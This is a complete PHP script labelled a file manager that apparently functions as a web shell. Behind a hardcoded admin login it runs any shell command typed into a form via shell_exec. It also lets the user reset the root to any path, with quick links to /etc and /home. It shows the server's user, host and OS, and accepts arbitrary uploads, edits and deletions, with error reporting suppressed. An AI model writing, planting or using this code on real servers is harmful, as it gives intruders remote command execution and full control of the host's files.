<?php
// ===================================================================
// fm.php — Full PHP File Manager
// ===================================================================
@ob_start();
@error_reporting(0);

$AUTH_USER    = 'admin';
$AUTH_PASS    = 'P@ssw0rd123!';
$SESSION_NAME = 'fm_sess';

if(session_status() === PHP_SESSION_NONE) {
    @session_name($SESSION_NAME);
    @session_start();
}

// ── Auth ──────────────────────────────────────────────────────────
if (isset($_POST['logout'])) {
    $_SESSION = [];
    @session_destroy();
    @ob_end_clean();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['u'], $_POST['p']) && $_POST['u'] === $AUTH_USER && $_POST['p'] === $AUTH_PASS) {
        $_SESSION['auth'] = true;
    } else {
        if (isset($_POST['u'])) $err = 'Invalid credentials';
        @ob_end_clean();
        show_login(isset($err) ? $err : '');
        exit;
    }
}

// ── Helpers ───────────────────────────────────────────────────────
function safe_path($base, $rel) {
    $base = rtrim(realpath($base), DIRECTORY_SEPARATOR);
    $full = realpath($base . DIRECTORY_SEPARATOR . ltrim($rel, '/\\'));
    if ($full === false) $full = $base . DIRECTORY_SEPARATOR . ltrim($rel, '/\\');
    if (strpos($full, $base) !== 0) return false;
    return $full;
}

function human_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes/1073741824, 2).' GB';
    if ($bytes >= 1048576)    return round($bytes/1048576, 2).' MB';
    if ($bytes >= 1024)       return round($bytes/1024, 2).' KB';
    return $bytes.' B';
}

function icon($name, $is_dir) {
    if ($is_dir) return '📁';
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $map = [
        'php'=>'🐘','html'=>'🌐','htm'=>'🌐','js'=>'📜','css'=>'🎨',
        'jpg'=>'🖼','jpeg'=>'🖼','png'=>'🖼','gif'=>'🖼','svg'=>'🖼','webp'=>'🖼',
        'pdf'=>'📄','txt'=>'📝','md'=>'📝','log'=>'📋',
        'zip'=>'📦','tar'=>'📦','gz'=>'📦','rar'=>'📦',
        'sh'=>'⚙️','py'=>'🐍','rb'=>'💎','sql'=>'🗄️',
        'mp4'=>'🎬','mp3'=>'🎵','json'=>'📊','xml'=>'📊','csv'=>'📊',
    ];
    return $map[$ext] ?? '📄';
}

function is_text($path) {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $text_exts = ['php','html','htm','js','css','txt','md','log','sh','py','rb','sql',
                  'json','xml','csv','conf','ini','htaccess','env','yaml','yml','ts','jsx'];
    return in_array($ext, $text_exts);
}

function enc($s) { return htmlspecialchars($s, ENT_QUOTES|ENT_HTML5, 'UTF-8'); }

// ── Root ──────────────────────────────────────────────────────────
$root = isset($_GET['root']) ? $_GET['root'] : $_SERVER['DOCUMENT_ROOT'];
if (!is_dir($root)) $root = dirname(__FILE__);
$root = rtrim(realpath($root) ?: $root, DIRECTORY_SEPARATOR);

$rel  = isset($_GET['d']) ? $_GET['d'] : '';
$cwd  = safe_path($root, $rel);
if (!$cwd || !is_dir($cwd)) { $cwd = $root; $rel = ''; }

$self = $_SERVER['PHP_SELF'];
$qbase = '?root='.urlencode($root).'&d='.urlencode($rel);

// ── Actions ───────────────────────────────────────────────────────
$msg = '';

// CMD execute
if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $output = shell_exec($_POST['cmd'].' 2>&1');
    $msg = '<pre class="cmd-out">'.enc($output ?? '(no output)').'</pre>';
}

// Upload
if (isset($_FILES['upload']) && $_FILES['upload']['error'] === 0) {
    $dest = $cwd.DIRECTORY_SEPARATOR.basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
        $msg = '<div class="ok">Uploaded: '.enc(basename($dest)).'</div>';
    else
        $msg = '<div class="err">Upload failed.</div>';
}

// New folder
if (isset($_POST['mkdir']) && $_POST['mkdir'] !== '') {
    $nd = $cwd.DIRECTORY_SEPARATOR.basename($_POST['mkdir']);
    mkdir($nd, 0755) ? $msg = '<div class="ok">Folder created.</div>' : $msg = '<div class="err">Failed to create folder.</div>';
}

// New file
if (isset($_POST['touch']) && $_POST['touch'] !== '') {
    $nf = $cwd.DIRECTORY_SEPARATOR.basename($_POST['touch']);
    file_put_contents($nf, '') !== false ? $msg = '<div class="ok">File created.</div>' : $msg = '<div class="err">Failed.</div>';
}

// Delete
if (isset($_GET['del'])) {
    $dp = safe_path($root, $_GET['del']);
    if ($dp && file_exists($dp)) {
        if (is_dir($dp)) {
            function rrmdir($d){ foreach(scandir($d) as $f){ if($f==='.'||$f==='..') continue; $p=$d.DIRECTORY_SEPARATOR.$f; is_dir($p)?rrmdir($p):unlink($p); } rmdir($d); }
            rrmdir($dp); $msg = '<div class="ok">Deleted folder.</div>';
        } else { unlink($dp); $msg = '<div class="ok">Deleted.</div>'; }
    }
}

// Rename
if (isset($_POST['rename_from'], $_POST['rename_to']) && $_POST['rename_from'] !== '') {
    $from = safe_path($root, $_POST['rename_from']);
    $to   = dirname($from).DIRECTORY_SEPARATOR.basename($_POST['rename_to']);
    if ($from && file_exists($from)) {
        rename($from, $to) ? $msg = '<div class="ok">Renamed.</div>' : $msg = '<div class="err">Rename failed.</div>';
    }
}

// Save edit
if (isset($_POST['save_path'], $_POST['content'])) {
    $sp = safe_path($root, $_POST['save_path']);
    if ($sp && is_file($sp)) {
        file_put_contents($sp, $_POST['content']) !== false
            ? $msg = '<div class="ok">Saved.</div>'
            : $msg = '<div class="err">Save failed.</div>';
    }
}

// Download
if (isset($_GET['dl'])) {
    $fp = safe_path($root, $_GET['dl']);
    if ($fp && is_file($fp)) {
        @ob_end_clean();
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fp).'"');
        header('Content-Length: '.filesize($fp));
        readfile($fp); exit;
    }
}

// Edit view
$edit_content = null;
$edit_rel = null;
if (isset($_GET['edit'])) {
    $ep = safe_path($root, $_GET['edit']);
    if ($ep && is_file($ep) && is_text($ep)) {
        $edit_content = file_get_contents($ep);
        $edit_rel = $_GET['edit'];
    }
}

// View raw
if (isset($_GET['view'])) {
    $vp = safe_path($root, $_GET['view']);
    if ($vp && is_file($vp)) {
        @ob_end_clean();
        $mime = mime_content_type($vp) ?: 'application/octet-stream';
        header('Content-Type: '.$mime);
        readfile($vp); exit;
    }
}

// ── Build breadcrumb ──────────────────────────────────────────────
$parts  = $rel === '' ? [] : explode('/', trim(str_replace('\\','/',$rel),'/'));
$crumbs = [['label'=>'~','rel'=>'']];
$cum    = '';
foreach ($parts as $p) {
    if ($p === '') continue;
    $cum .= ($cum===''?'':'/').$p;
    $crumbs[] = ['label'=>enc($p),'rel'=>$cum];
}

// ── List directory ────────────────────────────────────────────────
$dirs = []; $files = [];
foreach (scandir($cwd) as $f) {
    if ($f === '.') continue;
    $fp = $cwd.DIRECTORY_SEPARATOR.$f;
    $fr = ($rel===''?'':$rel.'/').$f;
    $item = ['name'=>$f,'rel'=>$fr,'size'=>is_file($fp)?filesize($fp):0,'mtime'=>filemtime($fp),'is_dir'=>is_dir($fp)];
    is_dir($fp) ? $dirs[]=$item : $files[]=$item;
}
usort($dirs,  fn($a,$b)=>strcasecmp($a['name'],$b['name']));
usort($files, fn($a,$b)=>strcasecmp($a['name'],$b['name']));
$entries = array_merge($dirs, $files);

// ── Sysinfo ───────────────────────────────────────────────────────
$whoami = trim(shell_exec('whoami 2>/dev/null') ?? shell_exec('echo %USERNAME% 2>nul') ?? '?');
$hostname = php_uname('n');
$os = php_uname('s').' '.php_uname('r');
$php_ver = PHP_VERSION;
$free_disk = function_exists('disk_free_space') ? human_size(@disk_free_space($cwd)) : '?';

// ── HTML ──────────────────────────────────────────────────────────
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager — <?= enc($cwd) ?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f1117;color:#c9d1d9;font-size:14px}
a{color:#58a6ff;text-decoration:none}a:hover{text-decoration:underline}
.top{background:#161b22;border-bottom:1px solid #30363d;padding:10px 18px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
.top h1{font-size:15px;font-weight:700;color:#f0f6fc;white-space:nowrap}
.sysinfo{font-size:12px;color:#8b949e;margin-left:auto;text-align:right}
.sysinfo span{color:#58a6ff}
.main{display:flex;height:calc(100vh - 50px)}
.sidebar{width:260px;min-width:200px;background:#161b22;border-right:1px solid #30363d;overflow-y:auto;padding:12px 0;resize:horizontal}
.content{flex:1;overflow-y:auto;padding:16px}
/* Breadcrumb */
.bc{display:flex;align-items:center;gap:4px;flex-wrap:wrap;margin-bottom:12px;font-size:13px}
.bc a{color:#58a6ff}.bc span{color:#8b949e}
/* Toolbar */
.tb{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
.tb form{display:flex;gap:4px}
input[type=text],input[type=password],textarea,select{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:5px 8px;border-radius:5px;font-size:13px}
input[type=text]:focus,textarea:focus{outline:1px solid #58a6ff;border-color:#58a6ff}
button,input[type=submit]{background:#238636;border:none;color:#fff;padding:5px 12px;border-radius:5px;cursor:pointer;font-size:13px}
button:hover,input[type=submit]:hover{background:#2ea043}
button.red{background:#b62324}button.red:hover{background:#da3633}
button.blue{background:#1f6feb}button.blue:hover{background:#388bfd}
button.gray{background:#30363d}button.gray:hover{background:#484f58}
/* File table */
table{width:100%;border-collapse:collapse}
th{background:#161b22;color:#8b949e;font-weight:600;text-align:left;padding:7px 10px;font-size:12px;position:sticky;top:0;border-bottom:1px solid #30363d}
td{padding:6px 10px;border-bottom:1px solid #21262d;vertical-align:middle;white-space:nowrap}
tr:hover td{background:#1c2128}
.fname{max-width:320px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sz{color:#8b949e;font-size:12px}
.mt{color:#8b949e;font-size:12px}
.acts{display:flex;gap:4px;justify-content:flex-end}
.acts a,.acts button{font-size:11px;padding:2px 7px}
/* Messages */
.ok{background:#0d1117;border:1px solid #238636;color:#3fb950;padding:8px 12px;border-radius:5px;margin-bottom:10px}
.err{background:#0d1117;border:1px solid #b62324;color:#f85149;padding:8px 12px;border-radius:5px;margin-bottom:10px}
/* CMD */
.cmd-wrap{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin-bottom:14px}
.cmd-wrap h3{margin-bottom:8px;font-size:13px;color:#8b949e}
.cmd-wrap form{display:flex;gap:6px}
.cmd-wrap input[type=text]{flex:1}
.cmd-out{background:#0d1117;border:1px solid #30363d;padding:10px;border-radius:5px;overflow-x:auto;font-size:12px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;margin-top:8px;color:#3fb950}
/* Upload */
.up-wrap{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin-bottom:14px}
.up-wrap h3{margin-bottom:8px;font-size:13px;color:#8b949e}
input[type=file]{color:#c9d1d9;font-size:13px}
/* Edit */
.edit-wrap{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:14px}
.edit-wrap h3{margin-bottom:8px;font-size:13px;color:#58a6ff}
.edit-wrap textarea{width:100%;height:60vh;font-family:monospace;font-size:13px;resize:vertical;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px;border-radius:5px}
.edit-wrap .act-row{display:flex;gap:8px;margin-top:8px}
/* Sidebar nav */
.snav{padding:4px 10px}
.snav a{display:block;padding:4px 8px;border-radius:4px;color:#8b949e;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.snav a:hover{background:#1c2128;color:#c9d1d9;text-decoration:none}
.snav-hdr{padding:6px 18px;font-size:11px;font-weight:600;color:#6e7681;text-transform:uppercase;letter-spacing:.05em;margin-top:8px}
/* Rename modal */
.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
.modal-bg.open{display:flex}
.modal{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;min-width:320px}
.modal h3{margin-bottom:12px;font-size:14px}
.modal input{width:100%;margin-bottom:10px}
.modal .row{display:flex;gap:8px;justify-content:flex-end}
</style>
</head>
<body>

<div class="top">
  <h1>📂 File Manager</h1>
  <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
    <form method="get" action="<?= $self ?>">
      <input type="hidden" name="d" value="">
      <input type="text" name="root" value="<?= enc($root) ?>" placeholder="Root path" style="width:240px">
      <button type="submit" class="blue">Go</button>
    </form>
    <form method="post" action="<?= $self.$qbase ?>">
      <button type="submit" name="logout" value="1" class="red">Logout</button>
    </form>
  </div>
  <div class="sysinfo">
    <span><?= enc($whoami) ?></span>@<span><?= enc($hostname) ?></span> &nbsp;|&nbsp;
    PHP <span><?= $php_ver ?></span> &nbsp;|&nbsp;
    OS: <span><?= enc($os) ?></span> &nbsp;|&nbsp;
    Free: <span><?= $free_disk ?></span>
  </div>
</div>

<div class="main">
<!-- Sidebar -->
<div class="sidebar">
  <div class="snav-hdr">Quick nav</div>
  <div class="snav">
    <?php
    $quick = [
      'Doc root'  => $_SERVER['DOCUMENT_ROOT'] ?? '/',
      'This file' => dirname(__FILE__),
      '/var/www'  => '/var/www',
      '/tmp'      => '/tmp',
      '/etc'      => '/etc',
      '/home'     => '/home',
      'C:\\'      => 'C:\\',
      'D:\\'      => 'D:\\',
    ];
    foreach ($quick as $label => $path) {
      if (is_dir($path))
        echo '<a href="'.enc($self.'?root='.urlencode($path).'&d=').'" title="'.enc($path).'">'.enc($label).'</a>';
    }
    ?>
  </div>
  <div class="snav-hdr" style="margin-top:12px">Current tree</div>
  <div class="snav">
    <?php
    // List subdirs of cwd
    foreach (scandir($cwd) as $f) {
        if ($f === '.' || $f === '..') continue;
        $fp = $cwd.DIRECTORY_SEPARATOR.$f;
        if (!is_dir($fp)) continue;
        $fr = ($rel===''?'':$rel.'/').$f;
        echo '<a href="'.enc($self.'?root='.urlencode($root).'&d='.urlencode($fr)).'" title="'.enc($f).'">📁 '.enc($f).'</a>';
    }
    ?>
  </div>
</div>

<!-- Content -->
<div class="content">

<?php if ($msg) echo $msg; ?>

<?php if ($edit_content !== null): ?>
<!-- Editor -->
<div class="edit-wrap">
  <h3>✏️ Editing: <?= enc($edit_rel) ?></h3>
  <form method="post" action="<?= enc($self.$qbase) ?>">
    <input type="hidden" name="save_path" value="<?= enc($edit_rel) ?>">
    <textarea name="content"><?= enc($edit_content) ?></textarea>
    <div class="act-row">
      <button type="submit">💾 Save</button>
      <a href="<?= enc($self.$qbase) ?>"><button type="button" class="gray">Cancel</button></a>
    </div>
  </form>
</div>
<?php else: ?>

<!-- CMD -->
<div class="cmd-wrap">
  <h3>⚡ Execute command</h3>
  <form method="post" action="<?= enc($self.$qbase) ?>">
    <input type="text" name="cmd" placeholder="whoami; id; ls -la" autocomplete="off" autofocus style="font-family:monospace">
    <button type="submit">Run</button>
  </form>
  <?php if ($msg && strpos($msg,'cmd-out') !== false) echo $msg; ?>
</div>

<!-- Upload -->
<div class="up-wrap">
  <h3>⬆️ Upload to: <?= enc($cwd) ?></h3>
  <form method="post" enctype="multipart/form-data" action="<?= enc($self.$qbase) ?>">
    <input type="file" name="upload" multiple>
    <button type="submit">Upload</button>
  </form>
</div>

<!-- Toolbar -->
<div class="bc">
  <?php foreach ($crumbs as $i => $c): ?>
    <?php if ($i < count($crumbs)-1): ?>
      <a href="<?= enc($self.'?root='.urlencode($root).'&d='.urlencode($c['rel'])) ?>"><?= $c['label'] ?></a>
      <span>/</span>
    <?php else: ?>
      <span style="color:#c9d1d9"><?= $c['label'] ?></span>
    <?php endif; ?>
  <?php endforeach; ?>
  <span style="color:#8b949e;font-size:12px;margin-left:4px">(<?= enc($cwd) ?>)</span>
</div>

<div class="tb">
  <form method="post" action="<?= enc($self.$qbase) ?>">
    <input type="text" name="mkdir" placeholder="New folder name">
    <button type="submit">📁 Create</button>
  </form>
  <form method="post" action="<?= enc($self.$qbase) ?>">
    <input type="text" name="touch" placeholder="New file name">
    <button type="submit">📄 Create</button>
  </form>
</div>

<!-- File listing -->
<table>
<thead><tr>
  <th style="width:30px"></th>
  <th>Name</th>
  <th>Size</th>
  <th>Modified</th>
  <th style="text-align:right">Actions</th>
</tr></thead>
<tbody>
<?php foreach ($entries as $e): ?>
  <?php
    $href_dir  = $self.'?root='.urlencode($root).'&d='.urlencode($e['rel']);
    $href_edit = $self.'?root='.urlencode($root).'&d='.urlencode($rel).'&edit='.urlencode($e['rel']);
    $href_dl   = $self.'?root='.urlencode($root).'&d='.urlencode($rel).'&dl='.urlencode($e['rel']);
    $href_view = $self.'?root='.urlencode($root).'&d='.urlencode($rel).'&view='.urlencode($e['rel']);
    $href_del  = $self.'?root='.urlencode($root).'&d='.urlencode($rel).'&del='.urlencode($e['rel']);
    $rel_parent = ($e['name'] === '..') ? (dirname($rel) === '.' ? '' : dirname($rel)) : null;
  ?>
  <tr>
    <td><?= icon($e['name'], $e['is_dir']) ?></td>
    <td class="fname">
      <?php if ($e['name'] === '..'): ?>
        <a href="<?= enc($self.'?root='.urlencode($root).'&d='.urlencode($rel_parent ?? '')) ?>">.. (up)</a>
      <?php elseif ($e['is_dir']): ?>
        <a href="<?= enc($href_dir) ?>"><?= enc($e['name']) ?></a>
      <?php else: ?>
        <?= enc($e['name']) ?>
      <?php endif; ?>
    </td>
    <td class="sz"><?= $e['is_dir'] ? '—' : human_size($e['size']) ?></td>
    <td class="mt"><?= date('Y-m-d H:i', $e['mtime']) ?></td>
    <td>
      <?php if ($e['name'] !== '..'): ?>
      <div class="acts">
        <?php if (!$e['is_dir'] && is_text($cwd.DIRECTORY_SEPARATOR.$e['name'])): ?>
          <a href="<?= enc($href_edit) ?>"><button class="blue" title="Edit">✏️</button></a>
        <?php endif; ?>
        <?php if (!$e['is_dir']): ?>
          <a href="<?= enc($href_dl) ?>"><button class="gray" title="Download">⬇️</button></a>
          <a href="<?= enc($href_view) ?>" target="_blank"><button class="gray" title="View">👁️</button></a>
        <?php endif; ?>
        <button class="gray" title="Rename"
          onclick="openRename('<?= enc(addslashes($e['rel'])) ?>','<?= enc(addslashes($e['name'])) ?>')">✏️ Rename</button>
        <a href="<?= enc($href_del) ?>" onclick="return confirm('Delete <?= enc(addslashes($e['name'])) ?>?')">
          <button class="red" title="Delete">🗑️</button>
        </a>
      </div>
      <?php endif; ?>
    </td>
  </tr>
<?php endforeach; ?>
</tbody>
</table>

<?php endif; ?>
</div><!-- /content -->
</div><!-- /main -->

<!-- Rename modal -->
<div class="modal-bg" id="rename-modal">
  <div class="modal">
    <h3>Rename</h3>
    <form method="post" action="<?= enc($self.$qbase) ?>">
      <input type="hidden" name="rename_from" id="rename_from">
      <input type="text" name="rename_to" id="rename_to" placeholder="New name" style="width:100%;margin-bottom:10px">
      <div class="row">
        <button type="button" class="gray" onclick="closeRename()">Cancel</button>
        <button type="submit">Rename</button>
      </div>
    </form>
  </div>
</div>

<script>
function openRename(rel, name) {
  document.getElementById('rename_from').value = rel;
  document.getElementById('rename_to').value = name;
  document.getElementById('rename-modal').classList.add('open');
  document.getElementById('rename_to').focus();
}
function closeRename() {
  document.getElementById('rename-modal').classList.remove('open');
}
document.getElementById('rename-modal').addEventListener('click', function(e){
  if (e.target === this) closeRename();
});
document.addEventListener('keydown', function(e){ if(e.key==='Escape') closeRename(); });
</script>

</body>
</html>
<?php
// ── Login page ────────────────────────────────────────────────────
function show_login($err='') {
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0f1117;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;display:flex;height:100vh;align-items:center;justify-content:center}
.box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:32px 36px;min-width:300px}
h2{margin-bottom:20px;font-size:18px;text-align:center;color:#f0f6fc}
label{font-size:13px;color:#8b949e;display:block;margin-bottom:4px}
input{width:100%;background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:8px 10px;border-radius:5px;font-size:14px;margin-bottom:14px}
input:focus{outline:1px solid #58a6ff;border-color:#58a6ff}
button{width:100%;background:#238636;border:none;color:#fff;padding:9px;border-radius:5px;cursor:pointer;font-size:14px;font-weight:600}
button:hover{background:#2ea043}
.err{color:#f85149;font-size:13px;margin-bottom:12px;text-align:center}
</style>
</head>
<body>
<div class="box">
  <h2>📂 File Manager</h2>
  <?php if($err) echo '<div class="err">'.htmlspecialchars($err).'</div>'; ?>
  <form method="post">
    <label>Username</label>
    <input type="text" name="u" autofocus autocomplete="off">
    <label>Password</label>
    <input type="password" name="p">
    <button type="submit">Login</button>
  </form>
</div>
</body>
</html>
<?php
}
?>
